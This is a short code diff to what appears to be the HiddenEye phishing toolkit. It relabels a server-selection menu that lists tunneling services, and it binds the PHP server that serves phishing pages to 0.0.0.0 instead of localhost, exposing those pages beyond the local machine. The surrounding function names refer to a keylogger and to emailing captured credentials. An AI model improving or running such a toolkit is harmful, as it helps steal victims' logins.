@@ -194,7 +194,7 @@ def selectServer(port):  # Question where user must select server
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ HOST SERVER SELECTION ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
     print(
         "\n {0}[{1}*{0}]{0}Select Any Available Server:{1}".format(MAIN0, MAIN4))
-    print("\n {0}[{1}0{0}]{1}LOCALHOST \n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo (Currently DOWN)\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel (Package Version)\n {0}[{1}5{0}]{1}Localtunnel (Binary Version)[Buggy]\n {0}[{1}6{0}]{1}OpenPort\n {0}[{1}7{0}]{1}Pagekite\n".format(MAIN0, MAIN2))
+    print("\n {0}[{1}0{0}]{1}LOCALHOST/Local Network (LAN Access) \n {0}[{1}1{0}]{1}Ngrok\n {0}[{1}2{0}]{1}Serveo (Currently DOWN)\n {0}[{1}3{0}]{1}Localxpose\n {0}[{1}4{0}]{1}Localtunnel (Package Version)\n {0}[{1}5{0}]{1}Localtunnel (Binary Version)[Buggy]\n {0}[{1}6{0}]{1}OpenPort\n {0}[{1}7{0}]{1}Pagekite\n".format(MAIN0, MAIN2))
 
     choice = input(" \n{0}HiddenEye >>> {2}".format(MAIN0, MAIN4, MAIN2))
     if choice == '0':
@@ -1066,7 +1066,7 @@ def addkeylogger():
 
 def runServer(port):
     system("fuser -k %s/tcp > /dev/null 2>&1" % (port))
-    system("cd Server/www/ && php -S 127.0.0.1:%s > /dev/null 2>&1 &" % (port))
+    system("cd Server/www/ && php -S 0.0.0.0:%s > /dev/null 2>&1 &" % (port)) #correction: localhost changed to address defined by user (not 127.0.0.1)
 
 
 def emailPrompt3(port):  # Ask user to start sending credentials to recipient Email Address.
